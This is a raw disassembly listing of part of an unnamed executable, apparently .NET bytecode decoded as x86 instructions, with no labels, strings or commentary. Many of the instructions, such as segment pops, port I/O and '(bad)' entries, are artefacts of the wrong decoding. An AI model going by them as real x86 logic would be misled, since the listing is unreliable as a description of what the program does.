  403b60:	05 06 2c 22 08       	add    $0x8222c06,%eax
  403b65:	17                   	pop    %ss
  403b66:	59                   	pop    %ecx
  403b67:	07                   	pop    %es
  403b68:	33 05 dd dc 00 00    	xor    0xdcdd,%eax
  403b6e:	00 06                	add    %al,(%esi)
  403b70:	02 11                	add    (%ecx),%dl
  403b72:	05 09 05 28 1d       	add    $0x1d280509,%eax
  403b77:	00 00                	add    %al,(%eax)
  403b79:	06                   	push   %es
  403b7a:	08 25 17 58 0c 6f    	or     %ah,0x6f0c5817
  403b80:	66 00 00             	data16 add %al,(%eax)
  403b83:	0a 2b                	or     (%ebx),%ch
  403b85:	7f 02                	jg     0x403b89
  403b87:	11 05 09 05 28 1d    	adc    %eax,0x1d280509
  403b8d:	00 00                	add    %al,(%eax)
  403b8f:	06                   	push   %es
  403b90:	13 06                	adc    (%esi),%eax
  403b92:	04 6f                	add    $0x6f,%al
  403b94:	55                   	push   %ebp
  403b95:	00 00                	add    %al,(%eax)
  403b97:	06                   	push   %es
  403b98:	2c 62                	sub    $0x62,%al
  403b9a:	04 6f                	add    $0x6f,%al
  403b9c:	55                   	push   %ebp
  403b9d:	00 00                	add    %al,(%eax)
  403b9f:	06                   	push   %es
  403ba0:	72 62                	jb     0x403c04
  403ba2:	01 00                	add    %eax,(%eax)
  403ba4:	70 72                	jo     0x403c18
  403ba6:	96                   	xchg   %eax,%esi
  403ba7:	01 00                	add    %eax,(%eax)
  403ba9:	70 6f                	jo     0x403c1a
  403bab:	63 00                	arpl   %eax,(%eax)
  403bad:	00 0a                	add    %cl,(%edx)
  403baf:	04 6f                	add    $0x6f,%al
  403bb1:	55                   	push   %ebp
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	06                   	push   %es
  403bb5:	72 9e                	jb     0x403b55
  403bb7:	01 00                	add    %eax,(%eax)
  403bb9:	70 09                	jo     0x403bc4
  403bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  403bbc:	63 00                	arpl   %eax,(%eax)
  403bbe:	00 0a                	add    %cl,(%edx)
  403bc0:	04 6f                	add    $0x6f,%al
  403bc2:	55                   	push   %ebp
  403bc3:	00 00                	add    %al,(%eax)
  403bc5:	06                   	push   %es
  403bc6:	72 a3                	jb     0x403b6b
  403bc8:	00 00                	add    %al,(%eax)
  403bca:	70 11                	jo     0x403bdd
  403bcc:	05 6f 63 00 00       	add    $0x636f,%eax
  403bd1:	0a 04 6f             	or     (%edi,%ebp,2),%al
  403bd4:	55                   	push   %ebp
  403bd5:	00 00                	add    %al,(%eax)
  403bd7:	06                   	push   %es
  403bd8:	72 b0                	jb     0x403b8a
  403bda:	01 00                	add    %eax,(%eax)
  403bdc:	70 11                	jo     0x403bef
  403bde:	06                   	push   %es
  403bdf:	6f                   	outsl  %ds:(%esi),(%dx)
  403be0:	63 00                	arpl   %eax,(%eax)
  403be2:	00 0a                	add    %cl,(%edx)
  403be4:	04 6f                	add    $0x6f,%al
  403be6:	55                   	push   %ebp
  403be7:	00 00                	add    %al,(%eax)
  403be9:	06                   	push   %es
  403bea:	72 b0                	jb     0x403b9c
  403bec:	01 00                	add    %eax,(%eax)
  403bee:	70 12                	jo     0x403c02
  403bf0:	07                   	pop    %es
  403bf1:	6f                   	outsl  %ds:(%esi),(%dx)
  403bf2:	67 00 00             	add    %al,(%bx,%si)
  403bf5:	0a 2c 0d 11 07 13 06 	or     0x6130711(,%ecx,1),%ch
  403bfc:	04 11                	add    $0x11,%al
  403bfe:	06                   	push   %es
  403bff:	05 6f 54 00 00       	add    $0x546f,%eax
  403c04:	06                   	push   %es
  403c05:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403c08:	07                   	pop    %es
  403c09:	00 00                	add    %al,(%eax)
  403c0b:	0a 3a                	or     (%edx),%bh
  403c0d:	47                   	inc    %edi
  403c0e:	ff                   	(bad)
  403c0f:	ff                   	(bad)
  403c10:	ff                   	lcall  (bad)
  403c11:	de 38                	fidivrs (%eax)
  403c13:	11 04 75 22 00 00 01 	adc    %eax,0x1000022(,%esi,2)
  403c1a:	13 08                	adc    (%eax),%ecx
  403c1c:	11 08                	adc    %ecx,(%eax)
  403c1e:	2c 07                	sub    $0x7,%al
  403c20:	11 08                	adc    %ecx,(%eax)
  403c22:	6f                   	outsl  %ds:(%esi),(%dx)
  403c23:	19 00                	sbb    %eax,(%eax)
  403c25:	00 0a                	add    %cl,(%edx)
  403c27:	dc 04 6f             	faddl  (%edi,%ebp,2)
  403c2a:	55                   	push   %ebp
  403c2b:	00 00                	add    %al,(%eax)
  403c2d:	06                   	push   %es
  403c2e:	2c 15                	sub    $0x15,%al
  403c30:	04 6f                	add    $0x6f,%al
  403c32:	55                   	push   %ebp
  403c33:	00 00                	add    %al,(%eax)
  403c35:	06                   	push   %es
  403c36:	72 62                	jb     0x403c9a
  403c38:	01 00                	add    %eax,(%eax)
  403c3a:	70 72                	jo     0x403cae
  403c3c:	be 01 00 70 6f       	mov    $0x6f700001,%esi
  403c41:	63 00                	arpl   %eax,(%eax)
  403c43:	00 0a                	add    %cl,(%edx)
  403c45:	04 6f                	add    $0x6f,%al
  403c47:	53                   	push   %ebx
  403c48:	00 00                	add    %al,(%eax)
  403c4a:	06                   	push   %es
  403c4b:	04 6f                	add    $0x6f,%al
  403c4d:	55                   	push   %ebp
  403c4e:	00 00                	add    %al,(%eax)
  403c50:	06                   	push   %es
  403c51:	2c 0b                	sub    $0xb,%al
  403c53:	04 6f                	add    $0x6f,%al
  403c55:	55                   	push   %ebp
  403c56:	00 00                	add    %al,(%eax)
  403c58:	06                   	push   %es
  403c59:	6f                   	outsl  %ds:(%esi),(%dx)
  403c5a:	68 00 00 0a 2a       	push   $0x2a0a0000
  403c5f:	00 01                	add    %al,(%ecx)
  403c61:	10 00                	adc    %al,(%eax)
  403c63:	00 02                	add    %al,(%edx)
  403c65:	00 9b 00 c0 5b 01    	add    %bl,0x15bc000(%ebx)
  403c6b:	15 00 00 00 00       	adc    $0x0,%eax
  403c70:	1b 30                	sbb    (%eax),%esi
  403c72:	05 00 6e 00 00       	add    $0x6e00,%eax
  403c77:	00 0b                	add    %cl,(%ebx)
  403c79:	00 00                	add    %al,(%eax)
  403c7b:	11 03                	adc    %eax,(%ebx)
  403c7d:	2c 09                	sub    $0x9,%al
  403c7f:	03 6f 69             	add    0x69(%edi),%ebp
  403c82:	00 00                	add    %al,(%eax)
  403c84:	0a 17                	or     (%edi),%dl
  403c86:	2e 01 2a             	add    %ebp,%cs:(%edx)
  403c89:	03 6f 53             	add    0x53(%edi),%ebp
  403c8c:	00 00                	add    %al,(%eax)
  403c8e:	0a 6f 57             	or     0x57(%edi),%ch
  403c91:	00 00                	add    %al,(%eax)
  403c93:	0a 0a                	or     (%edx),%cl
  403c95:	16                   	push   %ss
  403c96:	0b 02                	or     (%edx),%eax
  403c98:	2c 42                	sub    $0x42,%al
  403c9a:	02 6f 18             	add    0x18(%edi),%ch
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  403ca2:	1b 08                	sbb    (%eax),%ecx
  403ca4:	6f                   	outsl  %ds:(%esi),(%dx)
  403ca5:	06                   	push   %es
  403ca6:	00 00                	add    %al,(%eax)
  403ca8:	0a 0d 03 03 09 06    	or     0x6090303,%cl
  403cae:	04 28                	add    $0x28,%al
  403cb0:	1d 00 00 06 07       	sbb    $0x7060000,%eax
  403cb5:	25 17 58 0b 6f       	and    $0x6f0b5817,%eax
  403cba:	66 00 00             	data16 add %al,(%eax)
  403cbd:	0a 08                	or     (%eax),%cl
  403cbf:	6f                   	outsl  %ds:(%esi),(%dx)
  403cc0:	07                   	pop    %es
  403cc1:	00 00                	add    %al,(%eax)
  403cc3:	0a 2d dd de 21 08    	or     0x821dedd,%ch
  403cc9:	75 22                	jne    0x403ced
  403ccb:	00 00                	add    %al,(%eax)
  403ccd:	01 13                	add    %edx,(%ebx)
  403ccf:	04 11                	add    $0x11,%al
  403cd1:	04 2c                	add    $0x2c,%al
  403cd3:	07                   	pop    %es
  403cd4:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403cd7:	19 00                	sbb    %eax,(%eax)
  403cd9:	00 0a                	add    %cl,(%edx)
  403cdb:	dc 03                	faddl  (%ebx)
  403cdd:	16                   	push   %ss
  403cde:	03 6f 6a             	add    0x6a(%edi),%ebp
  403ce1:	00 00                	add    %al,(%eax)
  403ce3:	0a 28                	or     (%eax),%ch
  403ce5:	6b 00 00             	imul   $0x0,(%eax),%eax
  403ce8:	0a 2a                	or     (%edx),%ch
  403cea:	00 00                	add    %al,(%eax)
  403cec:	01 10                	add    %edx,(%eax)
  403cee:	00 00                	add    %al,(%eax)
  403cf0:	02 00                	add    (%eax),%al
  403cf2:	25 00 27 4c 00       	and    $0x4c2700,%eax
  403cf7:	14 00                	adc    $0x0,%al
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 13                	add    %dl,(%ebx)
  403cfd:	30 02                	xor    %al,(%edx)
  403cff:	00 35 00 00 00 0c    	add    %dh,0xc000000
  403d05:	00 00                	add    %al,(%eax)
  403d07:	11 02                	adc    %eax,(%edx)
  403d09:	75 1a                	jne    0x403d25
  403d0b:	00 00                	add    %al,(%eax)
  403d0d:	02 0a                	add    (%edx),%cl
  403d0f:	06                   	push   %es
  403d10:	2c 12                	sub    $0x12,%al
  403d12:	06                   	push   %es
  403d13:	6f                   	outsl  %ds:(%esi),(%dx)
  403d14:	2d 01 00 06 2c       	sub    $0x2c060001,%eax
  403d19:	0a 03                	or     (%ebx),%al
  403d1b:	06                   	push   %es
  403d1c:	6f                   	outsl  %ds:(%esi),(%dx)
  403d1d:	2b 01                	sub    (%ecx),%eax
  403d1f:	00 06                	add    %al,(%esi)
  403d21:	51                   	push   %ecx
  403d22:	17                   	pop    %ss
  403d23:	2a 02                	sub    (%edx),%al
  403d25:	75 5f                	jne    0x403d86
  403d27:	00 00                	add    %al,(%eax)
  403d29:	01 0b                	add    %ecx,(%ebx)
  403d2b:	07                   	pop    %es
  403d2c:	2c 0a                	sub    $0xa,%al
  403d2e:	03 07                	add    (%edi),%eax
  403d30:	6f                   	outsl  %ds:(%esi),(%dx)
  403d31:	6c                   	insb   (%dx),%es:(%edi)
  403d32:	00 00                	add    %al,(%eax)
  403d34:	0a 51 17             	or     0x17(%ecx),%dl
  403d37:	2a 03                	sub    (%ebx),%al
  403d39:	14 51                	adc    $0x51,%al
  403d3b:	16                   	push   %ss
  403d3c:	2a 00                	sub    (%eax),%al
  403d3e:	00 00                	add    %al,(%eax)
  403d40:	13 30                	adc    (%eax),%esi
  403d42:	01 00                	add    %eax,(%eax)
  403d44:	5c                   	pop    %esp
  403d45:	00 00                	add    %al,(%eax)
  403d47:	00 0d 00 00 11 02    	add    %cl,0x2110000
  403d4d:	75 1a                	jne    0x403d69
  403d4f:	00 00                	add    %al,(%eax)
  403d51:	02 0a                	add    (%edx),%cl
  403d53:	06                   	push   %es
  403d54:	2c 14                	sub    $0x14,%al
  403d56:	06                   	push   %es
  403d57:	6f                   	outsl  %ds:(%esi),(%dx)
  403d58:	25 01 00 06 28       	and    $0x28060001,%eax
  403d5d:	6d                   	insl   (%dx),%es:(%edi)
  403d5e:	00 00                	add    %al,(%eax)
  403d60:	0a 2d 07 06 6f 25    	or     0x256f0607,%ch
  403d66:	01 00                	add    %eax,(%eax)
  403d68:	06                   	push   %es
  403d69:	2a 02                	sub    (%edx),%al
  403d6b:	75 60                	jne    0x403dcd
  403d6d:	00 00                	add    %al,(%eax)
  403d6f:	01 0b                	add    %ecx,(%ebx)
  403d71:	07                   	pop    %es
  403d72:	2c 14                	sub    $0x14,%al
  403d74:	07                   	pop    %es
  403d75:	6f                   	outsl  %ds:(%esi),(%dx)
  403d76:	6e                   	outsb  %ds:(%esi),(%dx)
  403d77:	00 00                	add    %al,(%eax)
  403d79:	0a 28                	or     (%eax),%ch
  403d7b:	6d                   	insl   (%dx),%es:(%edi)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	0a 2d 07 07 6f 6e    	or     0x6e6f0707,%ch
  403d84:	00 00                	add    %al,(%eax)
  403d86:	0a 2a                	or     (%edx),%ch
  403d88:	02 75 61             	add    0x61(%ebp),%dh
  403d8b:	00 00                	add    %al,(%eax)
  403d8d:	01 0c 08             	add    %ecx,(%eax,%ecx,1)
  403d90:	2c 14                	sub    $0x14,%al
  403d92:	08 6f 6f             	or     %ch,0x6f(%edi)
  403d95:	00 00                	add    %al,(%eax)
  403d97:	0a 28                	or     (%eax),%ch
  403d99:	6d                   	insl   (%dx),%es:(%edi)
  403d9a:	00 00                	add    %al,(%eax)
  403d9c:	0a 2d 07 08 6f 6f    	or     0x6f6f0807,%ch
  403da2:	00 00                	add    %al,(%eax)
  403da4:	0a 2a                	or     (%edx),%ch
  403da6:	14 2a                	adc    $0x2a,%al
  403da8:	1b 30                	sbb    (%eax),%esi
  403daa:	02 00                	add    (%eax),%al
  403dac:	46                   	inc    %esi
  403dad:	00 00                	add    %al,(%eax)
  403daf:	00 0e                	add    %cl,(%esi)
  403db1:	00 00                	add    %al,(%eax)
  403db3:	11 02                	adc    %eax,(%edx)
  403db5:	17                   	pop    %ss
  403db6:	6f                   	outsl  %ds:(%esi),(%dx)
  403db7:	70 00                	jo     0x403db9
  403db9:	00 0a                	add    %cl,(%edx)
  403dbb:	0a 06                	or     (%esi),%al
  403dbd:	2c 34                	sub    $0x34,%al
  403dbf:	06                   	push   %es
  403dc0:	28 01                	sub    %al,(%ecx)
  403dc2:	00 00                	add    %al,(%eax)
  403dc4:	2b 6f 72             	sub    0x72(%edi),%ebp
  403dc7:	00 00                	add    %al,(%eax)
  403dc9:	0a 0b                	or     (%ebx),%cl
  403dcb:	2b 12                	sub    (%edx),%edx
  403dcd:	07                   	pop    %es
  403dce:	6f                   	outsl  %ds:(%esi),(%dx)
  403dcf:	73 00                	jae    0x403dd1
  403dd1:	00 0a                	add    %cl,(%edx)
  403dd3:	03 28                	add    (%eax),%ebp
  403dd5:	11 00                	adc    %eax,(%eax)
  403dd7:	00 06                	add    %al,(%esi)
  403dd9:	2c 04                	sub    $0x4,%al
  403ddb:	17                   	pop    %ss
  403ddc:	0c de                	or     $0xde,%al
  403dde:	19 07                	sbb    %eax,(%edi)
  403de0:	6f                   	outsl  %ds:(%esi),(%dx)
  403de1:	07                   	pop    %es
  403de2:	00 00                	add    %al,(%eax)
  403de4:	0a 2d e6 de 0a 07    	or     0x70adee6,%ch
  403dea:	2c 06                	sub    $0x6,%al
  403dec:	07                   	pop    %es
  403ded:	6f                   	outsl  %ds:(%esi),(%dx)
  403dee:	19 00                	sbb    %eax,(%eax)
  403df0:	00 0a                	add    %cl,(%edx)
  403df2:	dc 03                	faddl  (%ebx)
  403df4:	14 51                	adc    $0x51,%al
  403df6:	16                   	push   %ss
  403df7:	2a 08                	sub    (%eax),%cl
  403df9:	2a 00                	sub    (%eax),%al
  403dfb:	00 01                	add    %al,(%ecx)
  403dfd:	10 00                	adc    %al,(%eax)
  403dff:	00 02                	add    %al,(%edx)
  403e01:	00 17                	add    %dl,(%edi)
  403e03:	00 1e                	add    %bl,(%esi)
  403e05:	35 00 0a 00 00       	xor    $0xa00,%eax
  403e0a:	00 00                	add    %al,(%eax)
  403e0c:	1b 30                	sbb    (%eax),%esi
  403e0e:	02 00                	add    (%eax),%al
  403e10:	44                   	inc    %esp
  403e11:	00 00                	add    %al,(%eax)
  403e13:	00 0f                	add    %cl,(%edi)
  403e15:	00 00                	add    %al,(%eax)
  403e17:	11 02                	adc    %eax,(%edx)
  403e19:	17                   	pop    %ss
  403e1a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e1b:	70 00                	jo     0x403e1d
  403e1d:	00 0a                	add    %cl,(%edx)
  403e1f:	0a 06                	or     (%esi),%al
  403e21:	2c 35                	sub    $0x35,%al
  403e23:	06                   	push   %es
  403e24:	28 01                	sub    %al,(%ecx)
  403e26:	00 00                	add    %al,(%eax)
  403e28:	2b 6f 72             	sub    0x72(%edi),%ebp
  403e2b:	00 00                	add    %al,(%eax)
  403e2d:	0a 0b                	or     (%ebx),%cl
  403e2f:	2b 13                	sub    (%ebx),%edx
  403e31:	07                   	pop    %es
  403e32:	6f                   	outsl  %ds:(%esi),(%dx)
  403e33:	73 00                	jae    0x403e35
  403e35:	00 0a                	add    %cl,(%edx)
  403e37:	28 12                	sub    %dl,(%edx)
  403e39:	00 00                	add    %al,(%eax)
  403e3b:	06                   	push   %es
  403e3c:	0c 08                	or     $0x8,%al
  403e3e:	2c 04                	sub    $0x4,%al
  403e40:	08 0d de 16 07 6f    	or     %cl,0x6f0716de
  403e46:	07                   	pop    %es
  403e47:	00 00                	add    %al,(%eax)
  403e49:	0a 2d e5 de 0a 07    	or     0x70adee5,%ch
  403e4f:	2c 06                	sub    $0x6,%al
  403e51:	07                   	pop    %es
  403e52:	6f                   	outsl  %ds:(%esi),(%dx)
  403e53:	19 00                	sbb    %eax,(%eax)
  403e55:	00 0a                	add    %cl,(%edx)
  403e57:	dc 03                	faddl  (%ebx)
  403e59:	2a 09                	sub    (%ecx),%cl
  403e5b:	2a 01                	sub    (%ecx),%al
  403e5d:	10 00                	adc    %al,(%eax)
  403e5f:	00 02                	add    %al,(%edx)
  403e61:	00 17                	add    %dl,(%edi)
  403e63:	00 1f                	add    %bl,(%edi)
  403e65:	36 00 0a             	add    %cl,%ss:(%edx)
  403e68:	00 00                	add    %al,(%eax)
  403e6a:	00 00                	add    %al,(%eax)
  403e6c:	1b 30                	sbb    (%eax),%esi
  403e6e:	02 00                	add    (%eax),%al
  403e70:	40                   	inc    %eax
  403e71:	00 00                	add    %al,(%eax)
  403e73:	00 10                	add    %dl,(%eax)
  403e75:	00 00                	add    %al,(%eax)
  403e77:	11 02                	adc    %eax,(%edx)
  403e79:	6f                   	outsl  %ds:(%esi),(%dx)
  403e7a:	74 00                	je     0x403e7c
  403e7c:	00 0a                	add    %cl,(%edx)
  403e7e:	28 01                	sub    %al,(%ecx)
  403e80:	00 00                	add    %al,(%eax)
  403e82:	2b 6f 72             	sub    0x72(%edi),%ebp
  403e85:	00 00                	add    %al,(%eax)
  403e87:	0a 0a                	or     (%edx),%cl
  403e89:	2b 12                	sub    (%edx),%edx
  403e8b:	06                   	push   %es
  403e8c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e8d:	73 00                	jae    0x403e8f
  403e8f:	00 0a                	add    %cl,(%edx)
  403e91:	03 28                	add    (%eax),%ebp
  403e93:	11 00                	adc    %eax,(%eax)
  403e95:	00 06                	add    %al,(%esi)
  403e97:	2c 04                	sub    $0x4,%al
  403e99:	17                   	pop    %ss
  403e9a:	0b de                	or     %esi,%ebx
  403e9c:	19 06                	sbb    %eax,(%esi)
  403e9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403e9f:	07                   	pop    %es
  403ea0:	00 00                	add    %al,(%eax)
  403ea2:	0a 2d e6 de 0a 06    	or     0x60adee6,%ch
  403ea8:	2c 06                	sub    $0x6,%al
  403eaa:	06                   	push   %es
  403eab:	6f                   	outsl  %ds:(%esi),(%dx)
  403eac:	19 00                	sbb    %eax,(%eax)
  403eae:	00 0a                	add    %cl,(%edx)
  403eb0:	dc 03                	faddl  (%ebx)
  403eb2:	14 51                	adc    $0x51,%al
  403eb4:	16                   	push   %ss
  403eb5:	2a 07                	sub    (%edi),%al
  403eb7:	2a 01                	sub    (%ecx),%al
  403eb9:	10 00                	adc    %al,(%eax)
  403ebb:	00 02                	add    %al,(%edx)
  403ebd:	00 11                	add    %dl,(%ecx)
  403ebf:	00 1e                	add    %bl,(%esi)
  403ec1:	2f                   	das
  403ec2:	00 0a                	add    %cl,(%edx)
  403ec4:	00 00                	add    %al,(%eax)
  403ec6:	00 00                	add    %al,(%eax)
  403ec8:	1b 30                	sbb    (%eax),%esi
  403eca:	01 00                	add    %eax,(%eax)
  403ecc:	3e 00 00             	add    %al,%ds:(%eax)
  403ecf:	00 11                	add    %dl,(%ecx)
  403ed1:	00 00                	add    %al,(%eax)
  403ed3:	11 02                	adc    %eax,(%edx)
  403ed5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ed6:	74 00                	je     0x403ed8
  403ed8:	00 0a                	add    %cl,(%edx)
  403eda:	28 01                	sub    %al,(%ecx)
  403edc:	00 00                	add    %al,(%eax)
  403ede:	2b 6f 72             	sub    0x72(%edi),%ebp
  403ee1:	00 00                	add    %al,(%eax)
  403ee3:	0a 0a                	or     (%edx),%cl
  403ee5:	2b 13                	sub    (%ebx),%edx
  403ee7:	06                   	push   %es
  403ee8:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee9:	73 00                	jae    0x403eeb
  403eeb:	00 0a                	add    %cl,(%edx)
  403eed:	28 12                	sub    %dl,(%edx)
  403eef:	00 00                	add    %al,(%eax)
  403ef1:	06                   	push   %es
  403ef2:	0b 07                	or     (%edi),%eax
  403ef4:	2c 04                	sub    $0x4,%al
  403ef6:	07                   	pop    %es
  403ef7:	0c de                	or     $0xde,%al
  403ef9:	16                   	push   %ss
  403efa:	06                   	push   %es
  403efb:	6f                   	outsl  %ds:(%esi),(%dx)
  403efc:	07                   	pop    %es
  403efd:	00 00                	add    %al,(%eax)
  403eff:	0a 2d e5 de 0a 06    	or     0x60adee5,%ch
  403f05:	2c 06                	sub    $0x6,%al
  403f07:	06                   	push   %es
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	19 00                	sbb    %eax,(%eax)
  403f0b:	00 0a                	add    %cl,(%edx)
  403f0d:	dc 03                	faddl  (%ebx)
  403f0f:	2a 08                	sub    (%eax),%cl
  403f11:	2a 00                	sub    (%eax),%al
  403f13:	00 01                	add    %al,(%ecx)
  403f15:	10 00                	adc    %al,(%eax)
  403f17:	00 02                	add    %al,(%edx)
  403f19:	00 11                	add    %dl,(%ecx)
  403f1b:	00 1f                	add    %bl,(%edi)
  403f1d:	30 00                	xor    %al,(%eax)
  403f1f:	0a 00                	or     (%eax),%al
  403f21:	00 00                	add    %al,(%eax)
  403f23:	00 1b                	add    %bl,(%ebx)
  403f25:	30 02                	xor    %al,(%edx)
  403f27:	00 66 00             	add    %ah,0x0(%esi)
  403f2a:	00 00                	add    %al,(%eax)
  403f2c:	12 00                	adc    (%eax),%al
  403f2e:	00 11                	add    %dl,(%ecx)
  403f30:	02 6f 74             	add    0x74(%edi),%ch
  403f33:	00 00                	add    %al,(%eax)
  403f35:	0a 2d 02 16 2a 02    	or     0x22a1602,%ch
  403f3b:	6f                   	outsl  %ds:(%esi),(%dx)
  403f3c:	74 00                	je     0x403f3e
  403f3e:	00 0a                	add    %cl,(%edx)
  403f40:	6f                   	outsl  %ds:(%esi),(%dx)
  403f41:	75 00                	jne    0x403f43
  403f43:	00 0a                	add    %cl,(%edx)
  403f45:	0a 2b                	or     (%ebx),%ch
  403f47:	2f                   	das
  403f48:	06                   	push   %es
  403f49:	6f                   	outsl  %ds:(%esi),(%dx)
  403f4a:	06                   	push   %es
  403f4b:	00 00                	add    %al,(%eax)
  403f4d:	0a 0b                	or     (%ebx),%cl
  403f4f:	07                   	pop    %es
  403f50:	6f                   	outsl  %ds:(%esi),(%dx)
  403f51:	53                   	push   %ebx
  403f52:	00 00                	add    %al,(%eax)
  403f54:	0a 6f 5a             	or     0x5a(%edi),%ch
  403f57:	00 00                	add    %al,(%eax)
  403f59:	0a 2c 1b             	or     (%ebx,%ebx,1),%ch
  403f5c:	07                   	pop    %es
  403f5d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f5e:	53                   	push   %ebx
  403f5f:	00 00                	add    %al,(%eax)
  403f61:	0a 6f 5a             	or     0x5a(%edi),%ch
  403f64:	00 00                	add    %al,(%eax)
  403f66:	0a 72 ca             	or     -0x36(%edx),%dh
  403f69:	01 00                	add    %eax,(%eax)
  403f6b:	70 6f                	jo     0x403fdc
  403f6d:	76 00                	jbe    0x403f6f
  403f6f:	00 0a                	add    %cl,(%edx)
  403f71:	2c 04                	sub    $0x4,%al
  403f73:	17                   	pop    %ss
  403f74:	0c de                	or     $0xde,%al
  403f76:	1d 06 6f 07 00       	sbb    $0x76f06,%eax
  403f7b:	00 0a                	add    %cl,(%edx)
  403f7d:	2d c9 de 11 06       	sub    $0x611dec9,%eax
  403f82:	75 22                	jne    0x403fa6
  403f84:	00 00                	add    %al,(%eax)
  403f86:	01 0d 09 2c 06 09    	add    %ecx,0x9062c09
  403f8c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f8d:	19 00                	sbb    %eax,(%eax)
  403f8f:	00 0a                	add    %cl,(%edx)
  403f91:	dc 16                	fcoml  (%esi)
  403f93:	2a 08                	sub    (%eax),%cl
  403f95:	2a 00                	sub    (%eax),%al
  403f97:	00 01                	add    %al,(%ecx)
  403f99:	10 00                	adc    %al,(%eax)
  403f9b:	00 02                	add    %al,(%edx)
  403f9d:	00 16                	add    %dl,(%esi)
  403f9f:	00 3b                	add    %bh,(%ebx)
  403fa1:	51                   	push   %ecx
  403fa2:	00 11                	add    %dl,(%ecx)
  403fa4:	00 00                	add    %al,(%eax)
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	13 30                	adc    (%eax),%esi
  403faa:	02 00                	add    (%eax),%al
  403fac:	55                   	push   %ebp
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 13                	add    %dl,(%ebx)
  403fb1:	00 00                	add    %al,(%eax)
  403fb3:	11 02                	adc    %eax,(%edx)
  403fb5:	17                   	pop    %ss
  403fb6:	6f                   	outsl  %ds:(%esi),(%dx)
  403fb7:	70 00                	jo     0x403fb9
  403fb9:	00 0a                	add    %cl,(%edx)
  403fbb:	0a 06                	or     (%esi),%al
  403fbd:	2c 04                	sub    $0x4,%al
  403fbf:	06                   	push   %es
  403fc0:	8e 2d 02 16 2a 06    	mov    0x62a1602,%gs
  403fc6:	0b 16                	or     (%esi),%edx
  403fc8:	0c 2b                	or     $0x2b,%al
  403fca:	36 07                	ss pop %es
  403fcc:	08 9a 75 0b 00 00    	or     %bl,0xb75(%edx)
  403fd2:	01 0d 09 2c 26 09    	add    %ecx,0x9262c09
  403fd8:	6f                   	outsl  %ds:(%esi),(%dx)
  403fd9:	53                   	push   %ebx
  403fda:	00 00                	add    %al,(%eax)
  403fdc:	0a 6f 5a             	or     0x5a(%edi),%ch
  403fdf:	00 00                	add    %al,(%eax)
  403fe1:	0a 2c 19             	or     (%ecx,%ebx,1),%ch
  403fe4:	09 6f 53             	or     %ebp,0x53(%edi)
  403fe7:	00 00                	add    %al,(%eax)
  403fe9:	0a 6f 5a             	or     0x5a(%edi),%ch
  403fec:	00 00                	add    %al,(%eax)
  403fee:	0a 72 ca             	or     -0x36(%edx),%dh
  403ff1:	01 00                	add    %eax,(%eax)
  403ff3:	70 6f                	jo     0x404064
  403ff5:	76 00                	jbe    0x403ff7
  403ff7:	00 0a                	add    %cl,(%edx)
  403ff9:	2c 02                	sub    $0x2,%al
  403ffb:	17                   	pop    %ss
  403ffc:	2a 08                	sub    (%eax),%cl
  403ffe:	17                   	pop    %ss
  403fff:	58                   	pop    %eax
  404000:	0c 08                	or     $0x8,%al
  404002:	07                   	pop    %es
  404003:	8e 69 32             	mov    0x32(%ecx),%gs
  404006:	c4 16                	les    (%esi),%edx
  404008:	2a 00                	sub    (%eax),%al
  40400a:	00 00                	add    %al,(%eax)
  40400c:	1b 30                	sbb    (%eax),%esi
  40400e:	06                   	push   %es
  40400f:	00 89 01 00 00 14    	add    %cl,0x14000001(%ecx)
  404015:	00 00                	add    %al,(%eax)
  404017:	11 02                	adc    %eax,(%edx)
  404019:	2c 03                	sub    $0x3,%al
  40401b:	03 2d 01 2a 03 75    	add    0x75032a01,%ebp
  404021:	08 00                	or     %al,(%eax)
  404023:	00 01                	add    %al,(%ecx)
  404025:	0a 06                	or     (%esi),%al
  404027:	39 8e 00 00 00 06    	cmp    %ecx,0x6000000(%esi)
  40402d:	6f                   	outsl  %ds:(%esi),(%dx)
  40402e:	53                   	push   %ebx
  40402f:	00 00                	add    %al,(%eax)
  404031:	0a 28                	or     (%eax),%ch
  404033:	1b 00                	sbb    (%eax),%eax
  404035:	00 06                	add    %al,(%esi)
  404037:	0c 02                	or     $0x2,%al
  404039:	6f                   	outsl  %ds:(%esi),(%dx)
  40403a:	15 00 00 0a 0d       	adc    $0xd0a0000,%eax
  40403f:	2b 5a 09             	sub    0x9(%edx),%ebx
  404042:	6f                   	outsl  %ds:(%esi),(%dx)
  404043:	06                   	push   %es
  404044:	00 00                	add    %al,(%eax)
  404046:	0a a5 1d 00 00 01    	or     0x100001d(%ebp),%ah
  40404c:	13 04 12             	adc    (%edx,%edx,1),%eax
  40404f:	04 28                	add    $0x28,%al
  404051:	77 00                	ja     0x404053
  404053:	00 0a                	add    %cl,(%edx)
  404055:	2c 44                	sub    $0x44,%al
  404057:	08 d0                	or     %dl,%al
  404059:	02 00                	add    (%eax),%al
  40405b:	00 01                	add    %al,(%ecx)
  40405d:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  404060:	00 0a                	add    %cl,(%edx)
  404062:	28 4f 00             	sub    %cl,0x0(%edi)
  404065:	00 0a                	add    %cl,(%edx)
  404067:	2c 16                	sub    $0x16,%al
  404069:	06                   	push   %es
  40406a:	12 04 28             	adc    (%eax,%ebp,1),%al
  40406d:	77 00                	ja     0x40406f
  40406f:	00 0a                	add    %cl,(%edx)
  404071:	12 04 28             	adc    (%eax,%ebp,1),%al
  404074:	78 00                	js     0x404076
  404076:	00 0a                	add    %cl,(%edx)
  404078:	6f                   	outsl  %ds:(%esi),(%dx)
  404079:	11 00                	adc    %eax,(%eax)
  40407b:	00 0a                	add    %cl,(%edx)
